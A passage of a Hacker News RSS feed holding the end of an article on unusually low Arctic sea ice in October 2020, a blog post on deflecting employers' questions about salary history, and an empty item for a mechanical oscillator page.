<img src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/cache/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-ocean-temperature-analysis.png-nggid0520144-ngg0dyn-700x700x100-00f0w010c010r110f110r010t010.png" alt="arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-ocean-temperature-analysis" title="arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-ocean-temperature-analysis" width="700" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20700%200'%3E%3C/svg%3E" data-lazy-src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/cache/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-ocean-temperature-analysis.png-nggid0520144-ngg0dyn-700x700x100-00f0w010c010r110f110r010t010.png">
</a>
</p>
<p>When comparing the current ice concentration and thickness with the lowest ice extent in mid-September, we can see the growth on the edges. But towards Siberia, we can actually see a reduced concentration and reduced thickness (red colors). Ocean and air temperatures were not yet right to allow rapid refreeze towards Siberia at present time.</p>
<p><a href="https://www.severe-weather.eu/wp-content/gallery/andrej-news/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-concentration-change.png" title="" data-src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-concentration-change.png" data-thumbnail="https://www.severe-weather.eu/wp-content/gallery/andrej-news/thumbs/thumbs_arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-concentration-change.png" data-image-id="20156" data-title="arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-concentration-change" data-description="" target="_self">
<img src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/cache/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-concentration-change.png-nggid0520156-ngg0dyn-700x700x100-00f0w010c010r110f110r010t010.png" alt="arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-concentration-change" title="arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-concentration-change" width="700" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20700%200'%3E%3C/svg%3E" data-lazy-src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/cache/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-concentration-change.png-nggid0520156-ngg0dyn-700x700x100-00f0w010c010r110f110r010t010.png">
</a>
</p>
<p><a href="https://www.severe-weather.eu/wp-content/gallery/andrej-news/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-thickness-change.png" title="" data-src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-thickness-change.png" data-thumbnail="https://www.severe-weather.eu/wp-content/gallery/andrej-news/thumbs/thumbs_arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-thickness-change.png" data-image-id="20157" data-title="arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-thickness-change" data-description="" target="_self">
<img src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/cache/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-thickness-change.png-nggid0520157-ngg0dyn-700x700x100-00f0w010c010r110f110r010t010.png" alt="arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-thickness-change" title="arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-thickness-change" width="700" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20700%200'%3E%3C/svg%3E" data-lazy-src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/cache/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-thickness-change.png-nggid0520157-ngg0dyn-700x700x100-00f0w010c010r110f110r010t010.png">
</a>
</p>
<p>But temperature is not the only factor here. <span><strong>Ocean salinity</strong></span> also plays a big role in the production of ice. The saltier the water, the colder it needs to get for ice to form. Think of salt being used on the roads to prevent ice buildup.</p>
<p>The image below shows the Arctic ocean salinity, where we can see the fresher water in blue colors, and saltier waters in brownish hues. Transport of saltier water is obvious from the North Atlantic into the Arctic Ocean, specifically towards the eastern parts. Interestingly, we can see the dark colors around the coastal areas, which is very fresh water. That is the freshwater discharge from the Siberian rivers.</p>
<p><a href="https://www.severe-weather.eu/wp-content/gallery/andrej-news/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-ocean-salinity-analysis.png" title="" data-src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-ocean-salinity-analysis.png" data-thumbnail="https://www.severe-weather.eu/wp-content/gallery/andrej-news/thumbs/thumbs_arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-ocean-salinity-analysis.png" data-image-id="20143" data-title="arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-ocean-salinity-analysis" data-description="" target="_self">
<img src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/cache/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-ocean-salinity-analysis.png-nggid0520143-ngg0dyn-700x700x100-00f0w010c010r110f110r010t010.png" alt="arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-ocean-salinity-analysis" title="arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-ocean-salinity-analysis" width="700" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20700%200'%3E%3C/svg%3E" data-lazy-src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/cache/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-ocean-salinity-analysis.png-nggid0520143-ngg0dyn-700x700x100-00f0w010c010r110f110r010t010.png">
</a>
</p>
<p>We produced a short but very cool high-resolution video animation, which shows the Arctic ocean salinity in the past 5 months. You can see the <span><strong>ocean circulation</strong></span>, <strong><span>ocean currents,</span></strong> and the <strong><span>saltier water transport</span></strong> from the North Atlantic. Also note the freshwater entering the Arctic from the Siberian side, as the rivers discharge into the ocean, and note the freshwater increase during Summer, as melting ice makes the surface waters fresher.</p>


<h5><span><strong>SEA ICE ACROSS REGIONS</strong></span></h5>
<p>Many regions have regained ice since the lowest point in mid-September. But as we have shown above, the east Arctic Ocean is unusually warm and prevents fast sea-ice expansion.</p>
<p>The image below shows the sea ice extent by various regions across the Arctic. While some regions normally start the freezing at a later date, there are 3 regions that stand out, as they should be much higher than they currently are. The <strong><span>Siberian Sea</span></strong> region, the <span><strong>Kara Sea</strong></span>, and the <span><strong>Laptev Sea</strong></span>. These are the regions that we have highlighted higher up in the article, which also face the biggest temperature anomalies.</p>
<p><a href="https://www.severe-weather.eu/wp-content/gallery/andrej-news/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-laptev-barents-kara-sea-analysis.png" title="" data-src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-laptev-barents-kara-sea-analysis.png" data-thumbnail="https://www.severe-weather.eu/wp-content/gallery/andrej-news/thumbs/thumbs_arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-laptev-barents-kara-sea-analysis.png" data-image-id="20139" data-title="arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-laptev-barents-kara-sea-analysis" data-description="" target="_self">
<img src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/cache/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-laptev-barents-kara-sea-analysis.png-nggid0520139-ngg0dyn-700x700x100-00f0w010c010r110f110r010t010.png" alt="arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-laptev-barents-kara-sea-analysis" title="arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-laptev-barents-kara-sea-analysis" width="700" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20700%200'%3E%3C/svg%3E" data-lazy-src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/cache/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-laptev-barents-kara-sea-analysis.png-nggid0520139-ngg0dyn-700x700x100-00f0w010c010r110f110r010t010.png">
</a>
</p>
<p>Looking at the Siberian Arctic region, it is struggling to increase the ice extent. It is running really unusually low for this time of year, having just a few % of the normal sea ice extent expected for this date.</p>
<p><a href="https://www.severe-weather.eu/wp-content/gallery/andrej-news/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-siberian-extent.jpg" title="" data-src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-siberian-extent.jpg" data-thumbnail="https://www.severe-weather.eu/wp-content/gallery/andrej-news/thumbs/thumbs_arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-siberian-extent.jpg" data-image-id="20154" data-title="arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-siberian-extent" data-description="" target="_self">
<img src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/cache/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-siberian-extent.jpg-nggid0520154-ngg0dyn-700x700x100-00f0w010c010r110f110r010t010.jpg" alt="arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-siberian-extent" title="arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-siberian-extent" width="700" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20700%200'%3E%3C/svg%3E" data-lazy-src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/cache/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-siberian-extent.jpg-nggid0520154-ngg0dyn-700x700x100-00f0w010c010r110f110r010t010.jpg">
</a>
</p>
<p>And of course, the Laptev Sea, which has been at record low levels for quite some time now. In the previous decade, the Laptev Sea has been entirely frozen over by this time of year, while this year it simply cannot lift off the ground.</p>
<p><a href="https://www.severe-weather.eu/wp-content/gallery/andrej-news/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-laptev-extent.jpg" title="" data-src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-laptev-extent.jpg" data-thumbnail="https://www.severe-weather.eu/wp-content/gallery/andrej-news/thumbs/thumbs_arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-laptev-extent.jpg" data-image-id="20162" data-title="arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-laptev-extent" data-description="" target="_self">
<img src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/cache/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-laptev-extent.jpg-nggid0520162-ngg0dyn-700x700x100-00f0w010c010r110f110r010t010.jpg" alt="arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-laptev-extent" title="arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-laptev-extent" width="700" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20700%200'%3E%3C/svg%3E" data-lazy-src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/cache/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-laptev-extent.jpg-nggid0520162-ngg0dyn-700x700x100-00f0w010c010r110f110r010t010.jpg">
</a>
</p>
<p>But what is causing this unusual situation in the eastern Arctic Ocean? We have seen the ocean temperature anomalies and ocean salinity. But what has brought the Arctic Ocean into this state? Part of the answer lies in the Atmosphere, which is where we are heading next.<br>
&nbsp;</p>
<h5><span><strong>FROM THE OCEAN TO THE ATMOSPHERE</strong></span></h5>
<p>In the atmosphere, we usually always start with the temperatures. Looking at the January-September period, we can see that a hotspot has developed right over Siberia and the eastern Arctic Ocean. We can see a large area of temperatures 4-5°C above the long term average. We wrote about these <a href="https://www.severe-weather.eu/global-weather/arctic-circle-high-pressure-warming-fa/">Arctic heatwaves</a>, which were ongoing since Spring.</p>
<p><a href="https://www.severe-weather.eu/wp-content/gallery/andrej-news/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-january-to-september-temperature-anomaly.jpg" title="" data-src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-january-to-september-temperature-anomaly.jpg" data-thumbnail="https://www.severe-weather.eu/wp-content/gallery/andrej-news/thumbs/thumbs_arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-january-to-september-temperature-anomaly.jpg" data-image-id="20138" data-title="arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-january-to-september-temperature-anomaly" data-description="" target="_self">
<img src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/cache/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-january-to-september-temperature-anomaly.jpg-nggid0520138-ngg0dyn-700x700x100-00f0w010c010r110f110r010t010.jpg" alt="arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-january-to-september-temperature-anomaly" title="arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-january-to-september-temperature-anomaly" width="700" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20700%200'%3E%3C/svg%3E" data-lazy-src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/cache/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-january-to-september-temperature-anomaly.jpg-nggid0520138-ngg0dyn-700x700x100-00f0w010c010r110f110r010t010.jpg">
</a>
</p>
<p>A closer look at the August-September period reveals an even stronger hotspot, now expanded further into the Arctic Ocean, as the sea ice melted and more open water was exposed to the warmer weather.</p>
<p><a href="https://www.severe-weather.eu/wp-content/gallery/andrej-news/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-august-september-temperature-anomaly.png" title="" data-src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-august-september-temperature-anomaly.png" data-thumbnail="https://www.severe-weather.eu/wp-content/gallery/andrej-news/thumbs/thumbs_arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-august-september-temperature-anomaly.png" data-image-id="20125" data-title="arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-august-september-temperature-anomaly" data-description="" target="_self">
<img src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/cache/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-august-september-temperature-anomaly.png-nggid0520125-ngg0dyn-700x700x100-00f0w010c010r110f110r010t010.png" alt="arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-august-september-temperature-anomaly" title="arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-august-september-temperature-anomaly" width="700" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20700%200'%3E%3C/svg%3E" data-lazy-src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/cache/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-august-september-temperature-anomaly.png-nggid0520125-ngg0dyn-700x700x100-00f0w010c010r110f110r010t010.png">
</a>
</p>
<p>The reason behind this anomaly was a very specific pressure pattern. The October analysis so far, shows the high-pressure area dominating the Arctic region, while we can see a low-pressure system over the Siberian side.</p>
<p><a href="https://www.severe-weather.eu/wp-content/gallery/andrej-news/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-october-pressure-pattern.gif" title="" data-src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-october-pressure-pattern.gif" data-thumbnail="https://www.severe-weather.eu/wp-content/gallery/andrej-news/thumbs/thumbs_arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-october-pressure-pattern.gif" data-image-id="20163" data-title="arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-october-pressure-pattern" data-description="" target="_self">
<img src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/cache/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-october-pressure-pattern.gif-nggid0520163-ngg0dyn-700x700x100-00f0w010c010r110f110r010t010.gif" alt="arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-october-pressure-pattern" title="arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-october-pressure-pattern" width="700" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20700%200'%3E%3C/svg%3E">
</a>
</p>
<p>Such a pattern creates a very unique transpolar airflow over the eastern Arctic Ocean. The image below shows the average low-level wind flow in October so far. We can see the air transport across the Arctic, as warmer air enters the Arctic from one side, and cooler air leaving out on the other side.</p>
<p><a href="https://www.severe-weather.eu/wp-content/gallery/andrej-news/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-wind-flow-analysis.png" title="" data-src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-wind-flow-analysis.png" data-thumbnail="https://www.severe-weather.eu/wp-content/gallery/andrej-news/thumbs/thumbs_arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-wind-flow-analysis.png" data-image-id="20153" data-title="arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-wind-flow-analysis" data-description="" target="_self">
<img src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/cache/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-wind-flow-analysis.png-nggid0520153-ngg0dyn-700x700x100-00f0w010c010r110f110r010t010.png" alt="arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-wind-flow-analysis" title="arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-wind-flow-analysis" width="700" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20700%200'%3E%3C/svg%3E" data-lazy-src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/cache/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-wind-flow-analysis.png-nggid0520153-ngg0dyn-700x700x100-00f0w010c010r110f110r010t010.png">
</a>
</p>
<p>Looking at temperature anomalies in October so far, we can actually see a massive warm anomaly across the Siberian Arctic. That is where the warmer air was entering the region, replacing the colder air moving out into western Siberia.</p>
<p><a href="https://www.severe-weather.eu/wp-content/gallery/andrej-news/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-forecast-heatwave.png" title="" data-src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-forecast-heatwave.png" data-thumbnail="https://www.severe-weather.eu/wp-content/gallery/andrej-news/thumbs/thumbs_arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-forecast-heatwave.png" data-image-id="20132" data-title="arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-forecast-heatwave" data-description="" target="_self">
<img src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/cache/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-forecast-heatwave.png-nggid0520132-ngg0dyn-700x700x100-00f0w010c010r110f110r010t010.png" alt="arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-forecast-heatwave" title="arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-forecast-heatwave" width="700" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20700%200'%3E%3C/svg%3E" data-lazy-src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/cache/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-forecast-heatwave.png-nggid0520132-ngg0dyn-700x700x100-00f0w010c010r110f110r010t010.png">
</a>
</p>
<p>The past 10 days specifically, have seen anomalies in excess of 15°C across the Siberian Arctic ocean. This, together with the warmer ocean waters, has been a large ice growth inhibitor so far in October.</p>
<p><a href="https://www.severe-weather.eu/wp-content/gallery/andrej-news/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-temperature-forecast.png" title="" data-src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-temperature-forecast.png" data-thumbnail="https://www.severe-weather.eu/wp-content/gallery/andrej-news/thumbs/thumbs_arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-temperature-forecast.png" data-image-id="20149" data-title="arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-temperature-forecast" data-description="" target="_self">
<img src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/cache/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-temperature-forecast.png-nggid0520149-ngg0dyn-700x700x100-00f0w010c010r110f110r010t010.png" alt="arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-temperature-forecast" title="arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-temperature-forecast" width="648" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20648%200'%3E%3C/svg%3E" data-lazy-src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/cache/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-temperature-forecast.png-nggid0520149-ngg0dyn-700x700x100-00f0w010c010r110f110r010t010.png">
</a>
</p>
<p>The forecast is not looking any better. The pressure pattern has now actually reversed, with lower pressure over the Arctic. But this will change the airflow direction, just bringing warmer air from another source region. The first image shows the pressure anomalies next weekend. The second image shows the wind direction and temperature anomalies, revealing a large scale warmer air transport into the Siberian Arctic.</p>
<p><a href="https://www.severe-weather.eu/wp-content/gallery/andrej-news/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-heatwave-pressure-forecast.png" title="" data-src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-heatwave-pressure-forecast.png" data-thumbnail="https://www.severe-weather.eu/wp-content/gallery/andrej-news/thumbs/thumbs_arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-heatwave-pressure-forecast.png" data-image-id="20166" data-title="arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-heatwave-pressure-forecast" data-description="" target="_self">
<img src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/cache/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-heatwave-pressure-forecast.png-nggid0520166-ngg0dyn-700x700x100-00f0w010c010r110f110r010t010.png" alt="arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-heatwave-pressure-forecast" title="arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-heatwave-pressure-forecast" width="700" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20700%200'%3E%3C/svg%3E" data-lazy-src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/cache/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-heatwave-pressure-forecast.png-nggid0520166-ngg0dyn-700x700x100-00f0w010c010r110f110r010t010.png">
</a>
</p>
<p><a href="https://www.severe-weather.eu/wp-content/gallery/andrej-news/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-heatwave-forecast-1-1.png" title="" data-src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-heatwave-forecast-1-1.png" data-thumbnail="https://www.severe-weather.eu/wp-content/gallery/andrej-news/thumbs/thumbs_arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-heatwave-forecast-1-1.png" data-image-id="20165" data-title="arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-heatwave-forecast-1-1" data-description="" target="_self">
<img src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/cache/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-heatwave-forecast-1-1.png-nggid0520165-ngg0dyn-700x700x100-00f0w010c010r110f110r010t010.png" alt="arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-heatwave-forecast-1-1" title="arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-heatwave-forecast-1-1" width="700" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20700%200'%3E%3C/svg%3E" data-lazy-src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/cache/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-heatwave-forecast-1-1.png-nggid0520165-ngg0dyn-700x700x100-00f0w010c010r110f110r010t010.png">
</a>
</p>
<p>But of course, this does not mean that +20°C …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.severe-weather.eu/news/arctic-ocean-sea-ice-2020-jet-stream-effect-winter-fa/">https://www.severe-weather.eu/news/arctic-ocean-sea-ice-2020-jet-stream-effect-winter-fa/</a></em></p>]]>
            </description>
            <link>https://www.severe-weather.eu/news/arctic-ocean-sea-ice-2020-jet-stream-effect-winter-fa/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24900778</guid>
            <pubDate>Mon, 26 Oct 2020 20:11:44 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[What to Say When You're Asked for Your Salary History]]>
            </title>
            <description>
<![CDATA[
Score 86 | Comments 126 (<a href="https://news.ycombinator.com/item?id=24900382">thread link</a>) | @cushychicken
<br/>
October 26, 2020 | http://cushychicken.github.io/what-to-say-when-asked-salary-history/ | <a href="https://web.archive.org/web/*/http://cushychicken.github.io/what-to-say-when-asked-salary-history/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>TL;DR: “I’m still trying to establish whether this role is a good fit for me. Why? What is this role worth to your company?”</p><p>Reddit has been awash with posts of people getting asked for their salary history while job hunting. These posts are popping up on all sorts of subreddits. I’ve seen folks write about it in /r/personalfinance, /r/engineering, and even a bit in /r/ECE. There has been <a href="https://www.kalzumeus.com/2012/01/23/salary-negotiation/">a reasonable amount of ink spilled on salary negotiation online</a>, and nearly all of the advice agrees: <em>absolutely do not disclose your salary history to a prospective employer.</em> The anchoring effect of disclosing what you’re paid now naturally ties a follow-on offer to that salary.</p><p>Sorry, I slipped into manager-speak there. Let me rephrase that, in plain English. Disclosing your salary can turn a potential double digit raise when changing jobs to a few percent raise. You could leave thousands, or even <em>tens</em> of thousands of dollars on the table.</p><p>At the time of this writing, it’s still completely legal for a prospective employer to ask for salary history in <a href="https://www.hrdive.com/news/salary-history-ban-states-list/516662/">over half of the states in the USA</a>. I’m fortunate enough to live in Massachusetts, where asking for salary history has been illegal since 2018. In theory, this question isn’t a problem for me any more. In reality, it’s just changed shapes. Like a nasty cold, the question has just mutated into a new form. Instead of asking: “What is your current salary?”, prospective employers instead ask “What’s your <em>expectation</em> around salary?”</p><p>This is completely legal, but if you’re not cagey about it, you could cheerfully volunteer too much information about yourself. No law is broken if you say: “Well, I currently make <em>X dollars per year</em>, so I’d expect that plus <em>arbitrary percentage raise</em>.” Make no mistake: once you’ve given a number, it’s all over. A recruiter only hears the salary you volunteered to them. The clearest symptom of this is receiving job offers of your current salary, plus $5k or 5%.</p><p>(<strong>Note:</strong> When I say “recruiter” here, I’m referring to a recruiter or other HR professional working in-house at a company. This advice doesn’t really apply to recruiting and placement agencies. Since agency fees are based on a percentage of your salary upon getting hired, the incentives are aligned for them to ask for more money on your behalf. When you make more, they make more. Indeed, agency recruiters can be valuable information brokers. I’ve had agency recruiters tell me, completely voluntarily, that they’ve been trying to fill the position you’re discussing for six months. That’s <em>extraordinary</em> leverage for a qualified candidate.)</p><p>This potentially leaves you with a <em>boatload</em> of money on the table. Suppose, for a moment, that your skillset is one that this company desperately needs. As a result, your skillset is likely delivering way more value to that prospective employer at the margin. This means it’s a good idea for them to <em>pay you more money</em> to do your thing for them. By telling them what you get paid now, you peg the start of negotiations to that number, and give them a <em>huge discount</em> on your <em>very valuable</em> services.</p><p>Enough rambling about negotiating, and on to some practical advice! I’ve found a great turnabout phrase for being asked your salary history, or your salary expectations. Here’s what I’ve got:</p><blockquote><p>“I’m still trying to establish whether this role is a good fit for me. Why? What is this role worth to your company?”</p></blockquote><p>This is an excellent response, for three reasons.</p><ol><li>It offers no information <em>at all</em> about your current compensation.</li><li>It puts the person who asked you at an informational disadvantage. It shows that your counterparty is getting closer to a “yes”. Prioritizing good mutual fit in your response telegraphs to them that you are not convinced yet. This is a better negotiating position for you: making them work to convince you gives you <em>leverage.</em></li><li>It frequently yields a response in the form of the salary range that the employer is working with. I suspect this is out of a combination of surprise at being asked, and wanting to help make a good impression with you, the candidate, after learning that they haven’t convinced you to join yet.</li></ol><p>Got any other hot tips and tricks for salary negotiation? I’d love to hear them.</p><p>Also - that link I included above to Patrick McKenzie’s <a href="https://www.kalzumeus.com/2012/01/23/salary-negotiation/">blog post on salary negotiation</a>? Go read it. It’s excellent, and it <em>will</em> make you more money.</p></div></div>]]>
            </description>
            <link>http://cushychicken.github.io/what-to-say-when-asked-salary-history/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24900382</guid>
            <pubDate>Mon, 26 Oct 2020 19:39:13 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Two-Stage Mechanical Oscillator – A Mechanical Amplifier]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24900217">thread link</a>) | @danboarder
<br/>
October 26, 2020 | http://www.veljkomilkovic.com/OscilacijeEng.html | <a href="https://web.archive.org/web/*/http://www.veljkomilkovic.com/OscilacijeEng.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to retrieve article]]>
            </description>
            <link>http://www.veljkomilkovic.com/OscilacijeEng.html</link>
